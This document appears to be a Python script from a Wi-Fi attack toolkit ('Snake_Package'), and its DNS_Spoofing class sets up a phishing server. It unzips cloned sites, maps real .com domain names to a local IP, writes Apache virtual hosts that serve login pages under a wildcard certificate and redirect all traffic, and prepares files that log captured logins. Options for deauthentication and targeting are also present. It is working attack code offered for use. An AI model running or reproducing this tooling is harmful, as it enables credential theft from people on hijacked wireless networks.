#!/usr/bin/env python3

import subprocess
import os 
from subprocess import PIPE
import argparse
import sys
import shutil
import time
from zipfile import ZipFile
value = """RewriteCond %{HTTP_HOST}^(www\\.)?([^\\.]+)\\.local$ [NC]"""
Curent_dir2  ="".join(os.path.dirname(__file__)).replace("Snake_Package",'')
LOG_PATH = str("/".join(os.path.dirname(__file__).split('/')[:-1]))+"/Snake_Package"
user_name   = os.path.dirname(os.path.abspath(__file__)).split ("/")[2]
def Set_Log():             
    subprocess.call(["chmod +x "+Curent_dir2+"Snake_Package/ServerLog/SERVER_DNS_STREAM.py"],shell=True)
    subprocess.call(["chmod +x "+Curent_dir2+"Snake_Package/ServerLog/DNS_SPOOFING_LOG.py"],shell=True)
    command_run = Curent_dir2+"Snake_Package/ServerLog/SERVER_DNS_STREAM.py"
    command_proc3 = ' gnome-terminal --geometry 110x30+1000+60  -e ' +'"' + command_run +'"'               
    call_termminal = subprocess.call(command_proc3,shell=True,stderr=subprocess.PIPE)
    if os.path.exists(Curent_dir2+"Snake_Package/ServerLog/LOGIN_DB.txt") :
       group  = "chown "+ user_name+ ":"+user_name +" "+  Curent_dir2+"Snake_Package/ServerLog/LOGIN_DB.txt" 
       os.system(group)
    with open(Curent_dir2+'/WEB_AUTH_db.txt','a') as DB_PASS :
        group1  = "chown "+ user_name+ ":"+user_name +" "+  Curent_dir2+"WEB_AUTH_db.txt" 
        os.system(group1)       
      
class DNS_Spoofing:

        def __init__(self):
            self.parse_args()
            self.unzip_web()
            self.write_hosts()
            self.VirtualHost_files()       
            self.DNS_COPY_WEB()
        def DNS_COPY_WEB(self):
            try:
                if os.path.exists("/var/www/html/steam"):
                   for folder in os.listdir(LOG_PATH+"/sites"):
                        remove_sites = 'sudo rm -r /var/www/html/'+f'{folder}'
                        os.system(remove_sites)
                        shutil.copytree(Curent_dir2+'Snake_Package/sites/'+f'{folder}', '/var/www/html/'+f'{folder}')
                        enable = "sudo a2ensite  "+f'{folder}'+" > /dev/null 2>&1"
                        os.system(enable)  
                else:
                    for folder in os.listdir(LOG_PATH+"/sites"):
                        shutil.copytree(Curent_dir2+'Snake_Package/sites/'+f'{folder}', '/var/www/html/'+f'{folder}')
                        enable = "sudo a2ensite  "+f'{folder}'+"  >/dev/null 2>&1"
                        os.system(enable)
                command1 = 'sudo a2enmod dump_io >/dev/null 2>&1'
                subprocess.call(command1,shell=True,stderr=subprocess.PIPE)
                os.system("systemctl restart apache2 >/dev/null 2>&1")
                command = "sudo a2enmod dumpio >/dev/null 2>&1"
                subprocess.call(command,shell=True,stderr=subprocess.PIPE)    
                with open("/etc/apache2/ports.conf" ,'r') as portset :
                     port = portset.read()
                     if "172.160.255.49:80"  and "172.160.255.49:443"in port :
                         pass
                     else:  
                         with open(LOG_PATH+'/resources/ports_dns.txt' ,'r') as portset :  
                             port = portset.read()
                         with open ("/etc/apache2/ports.conf" ,'w') as portset :  
                              portset.write(port)   
                os.system("sudo a2enmod ssl > /dev/null 2>&1")                     
                os.system("sudo a2dissite 000-default.conf >/dev/null 2>&1")
                os.system("sudo a2enmod rewrite >/dev/null 2>&1")
                os.system("systemctl restart apache2 >/dev/null 2>&1")
                if os.system("sudo apache2ctl configtest >/dev/null 2>&1") == 0 :
                    print("[+] DNS has been Start")
                    print("[+] Apache2 Configuration Test  Syntax OK")
                else:
                    print("Apache Configtest Get Error") 
                    exit()  

            except FileExistsError as r  :
                print("[+] error " ,r)
                exit()
        def VirtualHost_files(self):
            if os.path.exists(LOG_PATH+'/VirtualHostFile'):
                print("[+] VirtualHost File Found ")
            else:    
                os.makedirs(LOG_PATH+'/VirtualHostFile')
                print("[+] VirtualHost Folder has been Created ")
                for file in os.listdir(LOG_PATH+"/sites"):
                    with  open(LOG_PATH+'/VirtualHostFile/'+file+".conf",'w')as config :
                            config = config.write(
                            f"""
                            <VirtualHost 172.160.255.49:80>
                                    ServerAdmin {file}@{file}.local
                                    ServerName {file}.wifi
                                    ServerAlias www.{file}.wifi
                                    ServerAlias {file}.local
                                    ServerAlias www.{file}.local
                                    ServerAlias {file}.com
                                    ServerAlias www.{file}.com

                                    DocumentRoot /var/www/html/{file}
                                    ErrorLog {LOG_PATH}/ServerLog/log_error.log
                                    CustomLog {LOG_PATH}/ServerLog/log_access.log combined
                                    <IfModule dir_module>
                                            DirectoryIndex login.html index.html index.php
                                    </IfModule>
                                    <IfModule mod_rewrite.c>
                                            RewriteEngine On
                                            # Redirect ALL domains except {file}.wifi to www.{file}.wifi
                                            RewriteCond %{{HTTP_HOST}} !^{file}\\.wifi$ [NC]
                                            RewriteCond %{{HTTP_HOST}} !^www\\.{file}\\.wifi$ [NC]
                                             RewriteRule ^(.*)$ http://www.{file}.wifi/$1 [L,R=301]
                                    </IfModule>

                                    <Directory /var/www/html/{file}>
                                        Options FollowSymLinks
                                        AllowOverride None
                                        Require all granted
                                    </Directory>
                            </VirtualHost>

                            <VirtualHost 172.160.255.49:443>
                                    ServerName {file}.wifi
                                    ServerAlias www.{file}.wifi
                                    ServerAlias {file}.local
                                    ServerAlias www.{file}.local
                                    ServerAlias {file}.com
                                    ServerAlias www.{file}.com

                                    DocumentRoot /var/www/html/{file}
                                    SSLEngine on
                                    SSLCertificateFile {LOG_PATH}/SSLCertificateFile/wildcard.crt
                                    SSLCertificateKeyFile {LOG_PATH}/SSLCertificateFile/wildcard.key

                                    ErrorLog {LOG_PATH}/ServerLog/log_error_ssl.log
                                    CustomLog {LOG_PATH}/ServerLog/log_access_ssl.log combined
                                    <IfModule dir_module>
                                        DirectoryIndex login.html index.html index.php
                                    </IfModule>
                                    <IfModule mod_rewrite.c>
                                        RewriteEngine On
                                        # Redirect ALL HTTPS domains except {file}.wifi to HTTP www.{file}.wifi
                                        RewriteCond %{{HTTP_HOST}} !^{file}\\.wifi$ [NC]
                                        RewriteCond %{{HTTP_HOST}} !^www\\.{file}\\.wifi$ [NC]
                                        RewriteRule ^(.*)$ http://www.{file}.wifi/$1 [L,R=301]
                                    </IfModule>

                                    <Directory /var/www/html/{file}>
                                        Options FollowSymLinks
                                        AllowOverride None
                                        Require all granted
                                    </Directory>
                            </VirtualHost>
                            """
                        )
                try:
                    file_copy = 'sudo cp '+ LOG_PATH+'/VirtualHostFile/* /etc/apache2/sites-available/ '
                    copy_VirtualHost = os.system(file_copy)
                    print("[+] VirtualHost Files has been Created ")
                except FileExistsError as r :
                    print(r)
                    exit()
        def write_hosts(self):
            if os.path.exists(LOG_PATH+'/resources/hosts.txt'):
               print("[+] Hosts dns Name List done ")
            else:
                with open(LOG_PATH+'/resources/hosts.txt','w') as hosts:
                    for host in os.listdir(LOG_PATH+"/sites"):  
                        with open(LOG_PATH+'/resources/hosts.txt','a') as hosts:                         
                          hosts.write(
                                    '172.160.255.49'.ljust(20) +  # Right-align IP
                                    ('www.' + host + '.local').ljust(25) +
                                    (host + '.local').ljust(22) +
                                    ('www.' + host + '.wifi').ljust(25) +
                                    (host + '.wifi').ljust(25) +
                                    (host + '.com').ljust(25) +
                                    ('www.' + host + '.com').ljust(25) +
                                    '\n'
                                )

                    print("[+] Hosts dns resolve Name has be Created")
                 
        def unzip_web(self):
            if os.path.exists(Curent_dir2+'Snake_Package/sites'):
               Set_Log()
            else:     
                with ZipFile(LOG_PATH+'/resources/sites.zip','r') as unzipweb :
                    unzipweb.extractall(path=Curent_dir2+'Snake_Package/')
                Set_Log()            
        def parse_args(self):
            parser = argparse.ArgumentParser( description="Usage: <OPtion> <arguments> ")
            parser.add_argument( '-S ',"--Show",action='store_true')
            parser.add_argument( '-I ',"--Interface",action=None)                          
            parser.add_argument( '-AP ',"--APName",action=None)
            parser.add_argument( '-D ',"--Deauth",action=None)
            parser.add_argument( '-CP ',"--Portal",action='store_true')
            parser.add_argument( '-L ',"--List",action='store_true')
            parser.add_argument( '-T ',"--Target",action=None )
            parser.add_argument( '-P ',"--Packet",action=None ,type=int)
            parser.add_argument( '--dns',action='store_true')
            
            self.args = parser.parse_args()
            if len(sys.argv)> 1 :
                 pass
            else:
                 parser.print_help()
                 exit()                
if __name__=='__main__':
     DNS_Spoofing()
'''
 config = config.write(
                            f"""
                            <VirtualHost 172.160.255.49:80>
                                    ServerAdmin {file}@{file}.local
                                    ServerName {file}.wifi
                                    ServerAlias *

                                    DocumentRoot /var/www/html/{file}
                                    ErrorLog {LOG_PATH}/ServerLog/log_error.log
                                    CustomLog {LOG_PATH}/ServerLog/log_access.log combined
                                    <IfModule dir_module>
                                            DirectoryIndex login.html index.html index.php
                                    </IfModule>
                                    <IfModule mod_rewrite.c>
                                            RewriteEngine On
                                            # Redirect ALL domains except {file}.wifi to www.{file}.wifi
                                            RewriteCond %{{HTTP_HOST}} !^{file}\\.wifi$ [NC]
                                            RewriteCond %{{HTTP_HOST}} !^www\\.{file}\\.wifi$ [NC]
                                             RewriteRule ^(.*)$ http://www.{file}.wifi/$1 [L,R=301]
                                    </IfModule>

                                    <Directory /var/www/html/{file}>
                                        Options FollowSymLinks
                                        AllowOverride None
                                        Require all granted
                                    </Directory>
                            </VirtualHost>

                            <VirtualHost 172.160.255.49:443>
                                    ServerName {file}.wifi
                                    ServerAlias *
     

                                    DocumentRoot /var/www/html/{file}
                                    SSLEngine on
                                    SSLCertificateFile {LOG_PATH}/SSLCertificateFile/wildcard.crt
                                    SSLCertificateKeyFile {LOG_PATH}/SSLCertificateFile/wildcard.key

                                    ErrorLog {LOG_PATH}/ServerLog/log_error_ssl.log
                                    CustomLog {LOG_PATH}/ServerLog/log_access_ssl.log combined
                                    <IfModule dir_module>
                                        DirectoryIndex login.html index.html index.php
                                    </IfModule>
                                    <IfModule mod_rewrite.c>
                                        RewriteEngine On
                                        # Redirect ALL HTTPS domains except {file}.wifi to HTTP www.{file}.wifi
                                        RewriteCond %{{HTTP_HOST}} !^{file}\\.wifi$ [NC]
                                        RewriteCond %{{HTTP_HOST}} !^www\\.{file}\\.wifi$ [NC]
                                        RewriteRule ^(.*)$ http://www.{file}.wifi/$1 [L,R=301]
                                    </IfModule>

                                    <Directory /var/www/html/{file}>
                                        Options FollowSymLinks
                                        AllowOverride None
                                        Require all granted
                                    </Directory>
                            </VirtualHost>
                            """
                        )
'''                        